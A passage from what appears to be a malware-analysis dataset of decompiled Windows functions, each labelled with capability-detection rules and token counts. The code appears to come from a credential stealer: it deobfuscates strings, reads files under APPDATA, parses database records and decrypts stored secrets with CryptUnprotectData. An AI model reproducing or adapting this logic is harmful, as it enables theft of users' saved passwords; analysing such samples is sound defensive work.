                                                                                     piVar15 = fcn.00403f65();\n                                                                                            ppiVar35[0x20] = piVar15;\n                                                                                            ppiVar35[2] = NULL;\n                                                                                            ppiVar35[1] = ppiVar35 +\n                                                                                                          0x21;\n                                                                                            *ppiVar35 = ppiVar35 + 0x1e;\n                                                                                            ppiVar32 = ppiVar35 + -1;\n                                                                                            ppiVar35[-1] = 0x40c08c;\n                                                                                            iVar6 = (*ppiVar35[0xc])();\n                                                                                            if (((iVar6 == 0) &&\n                                                                                                (ppiVar32[0x20] != NULL)\n                                                                                                ) && (ppiVar32[0x23] <\n                                                                                                      0x400)) {\n                                                                                                ppiVar32[2] = ppiVar32[\n                                                            0x23] + 1;\n                                                            *ppiVar32 = ppiVar32 + 0x3fc;\n                                                            ppiVar32[1] = ppiVar32[0x22];\n                                                            ppiVar32[-1] = 0x40c0d7;\n                                                            fcn.00412548();\n                                                            ppiVar32[5] = ppiVar32 + 0x3fc;\n                                                            ppiVar32[1] = \"%c%s\\a%s\\a%s\\b\\b\\b\\b\";\n                                                            *ppiVar32 = ppiVar32 + 0x1b;\n                                                            ppiVar32[4] = ppiVar32 + 0x2fc;\n                                                            ppiVar32[3] = ppiVar32 + 0x1fc;\n                                                            ppiVar32[2] = ppiVar32[0x704];\n                                                            ppiVar32[-1] = 0x40c10c;\n                                                            iVar6 = fcn.00412755();\n                                                            if (iVar6 != -1) {\n                                                                ppiVar32[3] = iVar6;\n                                                                ppiVar32[4] = 0x1;\n                                                                ppiVar32[2] = ppiVar32 + 0x1b;\n                                                                ppiVar32[1] = ppiVar32[0xe];\n                                                                *ppiVar32 = ppiVar32 + 0x1c;\n                                                                ppiVar32[-1] = 0x40c137;\n                                                                uVar7 = fcn.00412abf();\n                                                                ppiVar32[0xe] = ppiVar32[0xe] + iVar6;\n                                                                ppiVar32[0x1c] = uVar7;\n                                                            }\n                                                            ppiVar32[1] = NULL;\n                                                            *ppiVar32 = ppiVar32 + 0x21;\n                                                            ppcVar1 = ppiVar32 + 0x11;\n                                                            puVar36 = ppiVar32 + -1;\n                                                            ppiVar32 = ppiVar32 + -1;\n                                                            *puVar36 = 0x40c157;\n                                                            (**ppcVar1)();\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            *ppiVar32 = ppiVar32[0xd];\n                                                            piVar31 = ppiVar32 + -1;\n                                                            ppiVar32[-1] = 0x40bfab;\n                                                            (*ppiVar32[0x12])();\n                                                            }\n                                                            ppiVar30 = piVar31 + -4;\n                                                            *(piVar31 + -4) = 0x40c162;\n                                                            (**(piVar31 + 0x4c))();\n                                                            }\n                                                            *ppiVar30 = ppiVar30 + 0x1d;\n                                                            ppiVar30[-1] = 0x40c16e;\n                                                            fcn.00407f59();\n                                                            ppiVar37 = ppiVar30;\n                                                            }\n                                                            }\n                                                        }\ncode_r0x0040c16e:\n                                                        ppiVar37[1] = ppiVar37 + 0x4d;\n                                                        *ppiVar37 = ppiVar37 + 0x24;\n                                                        ppiVar37[-1] = 0x40c188;\n                                                        fcn.0040b312();\n                                                        return ppiVar37[0x1c];\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 10316
    },
    "0040c2db": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0040c2db(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uStack792;\n    int32_t iStack788;\n    uchar auStack783 [255];\n    uchar auStack528 [516];\n    \n    uStack792 = 0;\n    uVar1 = sub.msvcrt.dll_getenv(\"APPDATA\");\n    uVar2 = fcn.004081aa(\"%6\\\\.sQ0sid\\\\CYYWQR56.fli\");\n    fcn.004127a8(auStack528, 0x204, uVar2, uVar1);\n    iVar3 = sub.msvcrt.dll_fopen(auStack528, 0x423378);\n    if (iVar3 != 0) {\n        iStack788 = 0;\n        while (iVar4 = sub.msvcrt.dll_fgets(auStack783, 0xff, iVar3),  iVar4 != 0) {\n            iStack788 = 0;\n            uVar1 = fcn.004081aa(\"<s0W5WYWi>\");\n            iVar4 = fcn.004125de(0, uVar1, auStack783);\n            if (iVar4 == -1) {\n                uVar1 = fcn.004081aa(\"<RCld>\");\n                iVar4 = fcn.004125de(0, uVar1, auStack783);\n                if (iVar4 != -1) {\ncode_r0x0040c414:\n                    iVar4 = fcn.00412755(&iStack788, 0x4236a0, auStack783);\n                    goto code_r0x0040c3b2;\n                }\n                uVar1 = fcn.004081aa(\"<sC66gW0S>\");\n                iVar4 = fcn.004125de(0, uVar1, auStack783);\n                if (iVar4 != -1) goto code_r0x0040c414;\n            }\n            else {\n                iVar4 = fcn.00412755(&iStack788, \"%d%s\\a\", 2, auStack783);\ncode_r0x0040c3b2:\n                if (iVar4 == -1) {\n                    return 0;\n                }\n            }\n            if (iStack788 != 0) {\n                uStack792 = fcn.00412abf(&uStack792, 0xffffffff, &iStack788, 0xffffffff, 1);\n            }\n        }\n        sub.msvcrt.dll_fclose(iVar3);\n    }\n    return uStack792;\n}\n",
        "token_count": 567
    },
    "0040d63b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0040d63b(uint param_1, int32_t param_2, int32_t param_3, int32_t param_4, int32_t param_5)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uchar uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint8_t uStack33;\n    int32_t aiStack32 [4];\n    \n    cVar2 = fcn.0040d235(param_1, aiStack32, 4, param_2 + 0x34);\n    if (cVar2 == '\\0') {\ncode_r0x0040d66d:\n        uVar5 = 0;\n    }\n    else {\n        iVar6 = 0;\n        do {\n            uVar5 = fcn.0040d235(param_1, &uStack33, 1, iVar6 + 1 + param_2 + aiStack32[0]);\n            if (uVar5 == '\\0') goto code_r0x0040d66d;\n            iVar4 = iVar6 + 1;\n            if ((uStack33 & 0xbf) == 0) {\n                if (uStack33 == 0) goto code_r0x0040d66d;\n                break;\n            }\n            iVar1 = iVar6 + 2;\n            iVar6 = iVar4;\n        } while (iVar1 + param_2 + aiStack32[0] < param_3);\n        for (iVar6 = 0;\n            ((uStack33 != 0 && (iVar1 = iVar4 + iVar6 + 1 + param_2 + aiStack32[0],  iVar1 < param_3)) &&\n            (iVar6 < param_5)); iVar6 = iVar6 + 1) {\n            cVar2 = fcn.0040d235(param_1, &uStack33, 1, iVar1);\n            if (cVar2 == '\\0') goto code_r0x0040d66d;\n            if (uStack33 == 0x3f) break;\n            uVar3 = fcn.00412968(uStack33);\n            *(param_4 + iVar6) = uVar3;\n        }\n        *(param_4 + iVar6) = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 515
    },
    "0040dce9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0040dce9(uint *param_1)\n\n{\n    uchar *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    char *extraout_ECX;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    uint *puVar10;\n    ulong uVar11;\n    uint uVar12;\n    uint uStack1240;\n    uint uStack1236;\n    uchar *puStack1232;\n    char *pcStack1228;\n    char *pcStack1224;\n    uchar *puStack1220;\n    code *pcStack1188;\n    uchar *puVar13;\n    code *pcStack1180;\n    int32_t iStack1176;\n    int32_t iStack1172;\n    uint uStack1160;\n    int32_t iStack1156;\n    uchar *puStack1152;\n    int32_t iStack1148;\n    uchar *puStack1144;\n    uchar *puStack1140;\n    uchar auStack1136 [16];\n    char acStack1120 [12];\n    uint uStack1108;\n    uint uStack1104;\n    uint uStack1100;\n    uint uStack1096;\n    uint uStack1092;\n    uint auStack1084 [4];\n    uint auStack1068 [47];\n    uchar auStack880 [32];\n    uchar auStack848 [192];\n    uchar auStack656 [352];\n    uchar auStack304 [252];\n    char **ppcStack52;\n    \n    uStack1108 = 0;\n    puVar9 = 0x4228a0;\n    puVar10 = &stack0xfffffbc4;\n    for (iVar5 = 4; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    *param_1 = 0;\n    uStack1104 = 0;\n    uStack1100 = 0;\n    uStack1096 = 0;\n    uStack1092 = 0;\n    puVar9 = 0x4228b0;\n    puVar10 = &stack0xfffffbd4;\n    for (iVar5 = 4; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = *puVar9;\n        puVar9 = puVar9 + 1;\n        puVar10 = puVar10 + 1;\n    }\n    fcn.004081aa();\n    puVar1 = sub.KERNEL32.dll_LoadLibraryA();\n    if (puVar1 == NULL) {\n        return 0;\n    }\n    pcStack1180 = fcn.004081aa();\n    pcVar2 = sub.KERNEL32.dll_GetProcAddress();\n    fcn.004081aa();\n    iStack1148 = sub.KERNEL32.dll_GetProcAddress();\n    fcn.004081aa();\n    pcVar3 = sub.KERNEL32.dll_GetProcAddress();\n    fcn.004081aa();\n    uStack1160 = sub.KERNEL32.dll_GetProcAddress();\n    puStack1220 = 0x40dde9;\n    fcn.004081aa();\n    puStack1220 = 0x40ddf5;\n    uVar11 = sub.KERNEL32.dll_GetProcAddress();\n    puStack1220 = uVar11 >> 0x20;\n    pcStack1224 = \"zCQi5_0dd\";\n    pcStack1228 = 0x40de07;\n    puStack1220 = fcn.004081aa();\n    pcStack1228 = 0x40de13;\n    pcStack1224 = puVar1;\n    pcStack1188 = sub.KERNEL32.dll_GetProcAddress();\n    pcStack1228 = extraout_ECX;\n    if (((((pcVar3 != NULL && pcVar2 != NULL) && pcStack1180 != NULL) && iStack1176 != 0) && iStack1172 != 0) &&\n       (pcStack1188 != NULL)) {\n        pcStack1224 = &stack0xfffffb7c;\n        pcStack1228 = NULL;\n        puStack1232 = &stack0xfffffb90;\n        uStack1236 = 0x40de6c;\n        iVar5 = (*pcVar2)();\n        if (iVar5 == 0) {\n            puStack1220 = &stack0xfffffb84;\n            pcStack1228 = 0x200;\n            pcStack1224 = &stack0xfffffb80;\n            puStack1232 = iStack1156;\n            uStack1236 = 0x40de94;\n            iVar5 = (*pcVar3)();\n            if ((iVar5 == 0) && (puStack1152 != NULL)) {\n                uStack1236 = 0x40dea7;\n                iVar5 = fcn.004132e6();\n                if (iVar5 != 10) {\n                    uStack1236 = 0x40debd;\n                    iVar5 = fcn.004132e6();\n                    if (iVar5 != 0xc) {\n                        uStack1236 = 0x40dec7;\n                        iVar5 = fcn.004132e6();\n                        if (iVar5 != 0xb) {\n                            uStack1236 = 0x40ded1;\n                            iVar5 = fcn.004132e6();\n                            if (iVar5 != 0xe) {\n                                uStack1236 = 0x40dedb;\n                                iVar5 = fcn.004132e6();\n                                if (iVar5 != 0xd) {\n                                    uStack1236 = 0x40dee5;\n                                    iVar5 = fcn.004132e6();\n                                    if (iVar5 != 0xf) {\n                                        pcVar7 = NULL;\n                                        for (puVar13 = NULL; puVar13 < puStack1152; puVar13 = puVar13 + 1) {\n                                            pcStack1228 = &stack0xfffffba0;\n                                            pcStack1224 = 0x10;\n                                            iVar6 = puVar13 * 0x34 + iStack1148;\n                                            uStack1236 = 0x40e15c;\n                                            puStack1232 = iVar6;\n                                            iVar5 = fcn.004129c0();\n                                            pcVar8 = pcVar7;\n                                            if (iVar5 == 0) {\n                                                puStack1220 = 0xffffffff;\n                                                pcStack1224 = *(iVar6 + 0x10);\n                                                pcStack1228 = NULL;\n                                                puStack1232 = NULL;\n                                                uStack1236 = 0x40e1b9;\n                                                sub.KERNEL32.dll_WideCharToMultiByte();\n                                                uStack1236 = 0;\n                                                uStack1240 = 0;\n                                                uVar12 = 0xffffffff;\n                                                sub.KERNEL32.dll_WideCharToMultiByte\n                                                          (0, 0, *(iVar6 + 0x14) + 0x20, 0xffffffff, &stack0xfffffc90, \n                                                           0x100);\n                                                pcVar2 = NULL;\n                                                sub.KERNEL32.dll_WideCharToMultiByte\n                                                          (0, 0, *(iVar6 + 0x18) + 0x20, 0xffffffff, &stack0xfffffd70, \n                                                           0x100, 0, 0);\n                                                uStack1240 = 0;\n                                                iVar5 = (*pcVar2)(uVar12, iVar6, *(iVar6 + 0x14), *(iVar6 + 0x18), 0, 0\n                                                                  , &stack0xfffffb28);\n                                                if (iVar5 == 0) {\n                                                    puVar13 = &stack0xfffffed0;\n                                                    pcStack1180 = 0x100;\n                                                    pcStack1188 = 0xffffffff;\n                                                    puStack1232 = NULL;\n                                                    puStack1140 = puVar13;\n                                                    sub.KERNEL32.dll_WideCharToMultiByte();\n                                                    puStack1220 = &stack0xfffffcb0;\n                                                    pcStack1224 = 0x2;\n                                                    pcStack1228 = \"%c%s\\a%s:%s\\b\\b\\b\\b\";\n                                                    puStack1140 = NULL;\n                                                    uStack1236 = 0x40e32b;\n                                                    puStack1232 = &stack0xfffffb8c;\n                                                    puVar4 = fcn.00412755();\n                                                    if (puVar4 != 0xffffffff) {\n                                                        puStack1232 = &stack0xfffffb78;\n                                                        pcVar8 = pcVar7 + puVar4;\n                                                        uStack1236 = 0x40e354;\n                                                        pcStack1228 = pcVar7;\n                                                        pcStack1224 = &stack0xfffffb8c;\n                                                        puStack1220 = puVar4;\n                                                        uStack1160 = fcn.00412abf();\n                                                    }\n                                                }\n                                                if (puStack1144 != NULL) {\n                                                    puStack1232 = puStack1144;\n                                                    uStack1236 = 0x40e36b;\n                                                    (*pcStack1188)();\n                                                }\n                                            }\n                                            pcVar7 = pcVar8;\n                                        }\n                                        goto code_r0x0040e371;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                pcVar7 = NULL;\n                for (puVar13 = NULL; puVar13 < puStack1152; puVar13 = puVar13 + 1) {\n                    pcStack1228 = &stack0xfffffba0;\n                    pcStack1224 = 0x10;\n                    iVar6 = puVar13 * 0x38 + iStack1148;\n                    uStack1236 = 0x40df1c;\n                    puStack1232 = iVar6;\n                    iVar5 = fcn.004129c0();\n                    pcVar8 = pcVar7;\n                    if (iVar5 == 0) {\n                        puStack1220 = 0xffffffff;\n                        pcStack1224 = *(iVar6 + 0x10);\n                        pcStack1228 = NULL;\n                        puStack1232 = NULL;\n                        uStack1236 = 0x40df79;\n                        sub.KERNEL32.dll_WideCharToMultiByte();\n                        uStack1236 = 0;\n                        uStack1240 = 0;\n                        uVar12 = 0xffffffff;\n                        sub.KERNEL32.dll_WideCharToMultiByte\n                                  (0, 0, *(iVar6 + 0x14) + 0x20, 0xffffffff, &stack0xfffffc90, 0x100);\n                        pcVar2 = NULL;\n                        sub.KERNEL32.dll_WideCharToMultiByte\n                                  (0, 0, *(iVar6 + 0x18) + 0x20, 0xffffffff, &stack0xfffffd70, 0x100, 0);\n                        uStack1240 = 0;\n                        iVar5 = (*pcVar2)(uVar12, iVar6, *(iVar6 + 0x14), *(iVar6 + 0x18), 0, 0, 0, &stack0xfffffb28);\n                        if (iVar5 == 0) {\n                            puVar13 = &stack0xfffffed0;\n                            pcStack1180 = 0x100;\n                            pcStack1188 = 0xffffffff;\n                            puStack1232 = NULL;\n                            puStack1144 = puVar13;\n                            sub.KERNEL32.dll_WideCharToMultiByte();\n                            puStack1220 = &stack0xfffffcb0;\n                            pcStack1224 = 0x2;\n                            pcStack1228 = \"%c%s\\a%s:%s\\b\\b\\b\\b\";\n                            puStack1140 = NULL;\n                            uStack1236 = 0x40e0f3;\n                            puStack1232 = &stack0xfffffb8c;\n                            puVar4 = fcn.00412755();\n                            if (puVar4 != 0xffffffff) {\n                                puStack1232 = &stack0xfffffb78;\n                                pcVar8 = pcVar7 + puVar4;\n                                uStack1236 = 0x40e11c;\n                                pcStack1228 = pcVar7;\n                                pcStack1224 = &stack0xfffffb8c;\n                                puStack1220 = puVar4;\n                                uStack1160 = fcn.00412abf();\n                            }\n                        }\n                        if (puStack1144 != NULL) {\n                            puStack1232 = puStack1144;\n                            uStack1236 = 0x40e133;\n                            (*pcStack1188)();\n                        }\n                    }\n                    pcVar7 = pcVar8;\n                }\n                goto code_r0x0040e371;\n            }\n        }\n    }\n    pcVar7 = NULL;\ncode_r0x0040e371:\n    if (iStack1148 != 0) {\n        puStack1232 = iStack1148;\n        uStack1236 = 0x40e380;\n        (*pcStack1188)();\n    }\n    if (iStack1156 != 0) {\n        puStack1232 = &stack0xfffffb7c;\n        uStack1236 = 0x40e393;\n        (*pcStack1180)();\n    }\n    uStack1236 = 0x40e39c;\n    puStack1232 = puVar1;\n    sub.KERNEL32.dll_FreeLibrary();\n    *ppcStack52 = pcVar7;\n    return uVar11;\n}\n",
        "token_count": 2950
    },
    "0040e511": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040e511(uint param_1, int32_t param_2, uint *param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uStack2128;\n    int32_t *piStack2124;\n    int32_t *piStack2120;\n    int32_t iStack2112;\n    int32_t iStack2108;\n    int32_t iStack2104;\n    uint uStack2100;\n    uint uStack2096;\n    uint32_t uStack2092;\n    int32_t iStack2088;\n    uint uStack2084;\n    uint uStack2080;\n    int32_t aiStack2076 [249];\n    char acStack1080 [28];\n    int32_t aiStack1052 [257];\n    uint uStack24;\n    \n    piStack2124 = &iStack2104;\n    uStack2100 = 0;\n    iVar1 = fcn.0040e4c0(param_2, piStack2124);\n    iVar6 = iStack2104;\n    uStack2128 = iVar1 - 1;\n    fcn.004129e4(aiStack1052, 0, 0x400);\n    fcn.004129e4(aiStack2076, 0, 0x400);\n    uStack2096 = 0;\n    uStack2084 = 0;\n    uStack2080 = 0;\n    if (uStack2128 < 800000) {\n        iVar6 = iVar6 + param_2;\n        iVar1 = iVar6 + uStack2128;\n        piStack2120 = piStack2124;\n        piStack2124 = aiStack2076;\n        for (iVar5 = 0; iVar5 <= uStack2128; iVar5 = iVar5 + iStack2104) {\n            uVar2 = fcn.0040e4c0(iVar6, piStack2120);\n            iVar6 = iVar6 + iStack2104;\n            if (0xb < uVar2) {\n                if (((uVar2 & 1) == 0) && (uVar2 = uVar2 - 0xc >> 1,  iVar5 == 5)) {\n                    uVar8 = 0;\n                    iVar7 = 0;\n                    uStack2092 = uVar2;\n                    iStack2088 = iVar1;\n                    iVar3 = sub.CRYPT32.DLL_CryptUnprotectData(&uStack2092, 0, 0, 0, 0, 0, &uStack2084);\n                    if (iVar3 != 0) {\n                        if (((iStack2112 != 0) && (acStack1080[0] != '\\0')) && (iStack2104 != '\\0')) {\n                            *(iStack2108 + iStack2112) = 0;\n                            iVar3 = fcn.00412755(&piStack2124, \"%c%s\\a%s\\a%s\\b\\b\\b\\b\", uStack24, uVar8, acStack1080, \n                                                 iStack2108);\n                            if (iVar3 != -1) {\n                                uStack2128 = fcn.00412abf(&uStack2128, iVar7, &piStack2124, iVar3, 1);\n                                iVar7 = iVar7 + iVar3;\n                            }\n                        }\n                        sub.KERNEL32.dll_LocalFree(iStack2108);\n                    }\n                    fcn.004129e4(aiStack1052, 0, 0x400, iVar7);\n                    fcn.004129e4(piStack2124, 0, 0x400);\n                }\n                if ((0xc < uVar2) && ((uVar2 & 1) != 0)) {\n                    uVar2 = uVar2 - 0xd >> 1;\n                    piVar4 = piStack2124;\n                    if (iVar5 != 1) {\n                        if (iVar5 != 3) goto code_r0x0040e789;\n                        piVar4 = aiStack1052;\n                    }\n                    fcn.00412548(piVar4, iVar1, uVar2 + 1);\n                }\n            }\ncode_r0x0040e789:\n            iVar1 = iVar1 + uVar2;\n        }\n    }\n    *param_3 = 0;\n    return uStack2100;\n}\n",
        "token_count": 1003
    },
    "0040e7b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0040e7b0(uint param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iStack76;\n    int32_t iStack60;\n    int32_t iStack56;\n    char *pcStack52;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t iStack36;\n    uchar auStack32 [16];\n    \n    iStack60 = 0;\n    iStack56 = fcn.00408042(param_2, 0, &iStack60);\n    if (iStack56 == 0) {\n        return 0;\n    }\n    if (iStack60 < 1) {\n        return 0;\n    }\n    pcStack52 = iStack56 + 0x10;\n    uVar2 = fcn.0040e4f7(&pcStack52);\n    sub.msvcrt.dll_sprintf(auStack32, \"0x%02hhX\", *(iStack56 + 100));\n    iVar3 = sub.msvcrt.dll_strcmp(auStack32, \"0x0D\");\n    if ((iVar3 == 0) || (iVar3 = sub.msvcrt.dll_strcmp(auStack32, \"0x05\"),  iVar3 == 0)) {\n        uStack48 = 0;\n        iVar7 = 0;\n        iStack44 = 0;\n        iVar6 = 0;\n        iVar3 = iStack60 / (uVar2 & 0xffff);\n        for (iStack76 = 1; iStack76 < iVar3; iStack76 = iStack76 + 1) {\n            pcStack52 = iStack56 + iVar7;\n            if (*pcStack52 == '\\r') {\n                pcStack52 = pcStack52 + 3;\n                iVar1 = fcn.0040e4f7(&pcStack52);\n                uVar4 = fcn.0040e4f7(&pcStack52);\n                iStack40 = 0;\n                pcStack52 = (uVar4 & 0xffff) + iVar7 + iStack56;\n                for (; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    iStack36 = 1;\n                    iVar5 = fcn.0040e4c0(pcStack52, &iStack36);\n                    if (10000 < iVar5) break;\n                    pcStack52 = pcStack52 + iStack36;\n                    fcn.0040e4c0(pcStack52, &iStack36);\n                    pcStack52 = pcStack52 + iStack36;\n                    iStack40 = fcn.0040e511(param_1, pcStack52, &iStack44);\n                    if (iStack40 != 0) {\n                        uStack48 = fcn.00412abf(&uStack48, iVar6, &iStack40, iStack44, 1);\n                        iVar6 = iVar6 + iStack44;\n                    }\n                    pcStack52 = pcStack52 + iVar5;\n                }\n            }\n            iVar7 = iVar7 + (uVar2 & 0xffff);\n        }\n    }\n    fcn.00407f59(&iStack56);\n    return uStack48;\n}\n",
        "token_count": 751
    },
    "0040e9b6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.0040e9b6(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uchar *puVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uchar *puVar12;\n    char *pcVar13;\n    uint uStack20;\n    \n    uStack20 = 0x40e9c4;\n    iVar3 = fcn.0041f3f0();\n    iVar3 = -iVar3;\n    iVar6 = *(&stack0x00001bd4 + iVar3);\n    *(&stack0x00000040 + iVar3) = 0;\n    *(&stack0xfffffff4 + iVar3) = &stack0x0000003c + iVar3;\n    *(&stack0xfffffff0 + iVar3) = iVar6;\n    *(&stack0xffffffec + iVar3) = 0x40e9ec;\n    iVar4 = fcn.0040e4c0();\n    *(&stack0xfffffff8 + iVar3) = 0x400;\n    *(&stack0xfffffff4 + iVar3) = 0;\n    *(&stack0x00000020 + iVar3) = iVar4 + -1;\n    iVar4 = *(&stack0x0000003c + iVar3);\n    *(&stack0xfffffff0 + iVar3) = &stack0x00000680 + iVar3;\n    *(&stack0xffffffec + iVar3) = 0x40ea14;\n    fcn.004129e4();\n    *(&stack0xfffffff8 + iVar3) = 0x400;\n    *(&stack0xfffffff4 + iVar3) = 0;\n    *(&stack0xfffffff0 + iVar3) = &stack0x00000280 + iVar3;\n    *(&stack0xffffffec + iVar3) = 0x40ea2c;\n    fcn.004129e4();\n    *(&stack0xfffffff8 + iVar3) = 0x100;\n    *(&stack0xfffffff4 + iVar3) = 0;\n    *(&stack0xfffffff0 + iVar3) = &stack0x00000180 + iVar3;\n    *(&stack0xffffffec + iVar3) = 0x40ea4b;\n    fcn.004129e4();\n    *(&stack0xfffffff8 + iVar3) = 0x80;\n    *(&stack0xfffffff4 + iVar3) = 0;\n    *(&stack0xfffffff0 + iVar3) = &stack0x00000080 + iVar3;\n    *(&stack0xffffffec + iVar3) = 0x40ea6a;\n    fcn.004129e4();\n    *(&stack0xfffffff8 + iVar3) = 0x30;\n    *(&stack0xfffffff4 + iVar3) = 0;\n    *(&stack0xfffffff0 + iVar3) = &stack0x00000050 + iVar3;\n    *(&stack0xffffffec + iVar3) = 0x40ea86;\n    fcn.004129e4();\n    *(&stack0xfffffff8 + iVar3) = 0x80;\n    *(&stack0xfffffff4 + iVar3) = 0;\n    *(&stack0xfffffff0 + iVar3) = &stack0x00000100 + iVar3;\n    *(&stack0xffffffec + iVar3) = 0x40eaa5;\n    fcn.004129e4();\n    *(&stack0x00000044 + iVar3) = 0;\n    *(&stack0x00000018 + iVar3) = 0;\n    if (*(&stack0x00000020 + iVar3) < 800000) {\n        iVar6 = iVar6 + iVar4;\n        *(&stack0x00000014 + iVar3) = 0;\n        *(&stack0x00000028 + iVar3) = &stack0x0000003c + iVar3;\n        *(&stack0x00000024 + iVar3) = &stack0x00000280 + iVar3;\n        *(&stack0x0000001c + iVar3) = iVar6;\n        *(&stack0x00000010 + iVar3) = iVar6 + *(&stack0x00000020 + iVar3);\n        while (*(&stack0x00000014 + iVar3) == *(&stack0x00000020 + iVar3) ||\n               *(&stack0x00000014 + iVar3) < *(&stack0x00000020 + iVar3)) {\n            *(&stack0xfffffff4 + iVar3) = *(&stack0x00000028 + iVar3);\n            *(&stack0xfffffff0 + iVar3) = *(&stack0x0000001c + iVar3);\n            *(&stack0xffffffec + iVar3) = 0x40eb04;\n            uVar5 = fcn.0040e4c0();\n            *(&stack0x0000001c + iVar3) = *(&stack0x0000001c + iVar3) + *(&stack0x0000003c + iVar3);\n            if (0xb < uVar5) {\n                if (((uVar5 & 1) == 0) && (uVar5 = uVar5 - 0xc >> 1,  *(&stack0x00000014 + iVar3) == 5)) {\n                    puVar8 = &stack0x0000004c + iVar3;\n                    *(&stack0xfffffff8 + iVar3) = 4;\n                    *(&stack0xfffffff4 + iVar3) = 0;\n                    *(&stack0xfffffff0 + iVar3) = puVar8;\n                    *(&stack0xffffffec + iVar3) = 0x40eb51;\n                    fcn.004129e4();\n                    *(&stack0xfffffff8 + iVar3) = 3;\n                    *(&stack0xfffffff0 + iVar3) = puVar8;\n                    *(&stack0xfffffff4 + iVar3) = *(&stack0x00000010 + iVar3);\n                    *(&stack0xffffffec + iVar3) = 0x40eb69;\n                    sub.msvcrt.dll_strncpy();\n                    *(&stack0xfffffff4 + iVar3) = 0x423a0c;\n                    *(&stack0xfffffff0 + iVar3) = &stack0x00000048 + iVar3;\n                    *(&stack0xffffffec + iVar3) = 0x40eb79;\n                    sub.msvcrt.dll_strcpy();\n                    *(&stack0xfffffff4 + iVar3) = puVar8;\n                    *(&stack0xfffffff0 + iVar3) = &stack0x00000048 + iVar3;\n                    *(&stack0xffffffec + iVar3) = 0x40eb85;\n                    iVar6 = sub.msvcrt.dll_strcmp();\n                    if (iVar6 == 0) {\n                        iVar6 = *(&stack0x00000010 + iVar3);\n                        *(&stack0x0000002c + iVar3) = &stack0x00000180 + iVar3;\n                        puVar10 = iVar6 + 3;\n                        puVar11 = &stack0x00000050 + iVar3;\n                        for (iVar4 = 3; iVar4 != 0; iVar4 = iVar4 + -1) {\n                            *puVar11 = *puVar10;\n                            puVar10 = puVar10 + 1;\n                            puVar11 = puVar11 + 1;\n                        }\n                        uVar7 = *(&stack0x00001bdc + iVar3);\n                        puVar8 = iVar6 + 0xf;\n                        puVar12 = &stack0x00000180 + iVar3;\n                        for (iVar4 = uVar5 - 0x1f; iVar4 != 0; iVar4 = iVar4 + -1) {\n                            *puVar12 = *puVar8;\n                            puVar8 = puVar8 + 1;\n                            puVar12 = puVar12 + 1;\n                        }\n                        puVar8 = &stack0x00000a80 + iVar3;\n                        *(&stack0xfffffff4 + iVar3) = uVar7;\n                        *(&stack0xfffffff0 + iVar3) = puVar8;\n                        *(&stack0xffffffec + iVar3) = 0x40ebd0;\n                        fcn.0041f980();\n                        *(&stack0xfffffff8 + iVar3) = &stack0x00000050 + iVar3;\n                        *(&stack0xfffffff0 + iVar3) = puVar8;\n                        pcVar1 = &stack0x00000080 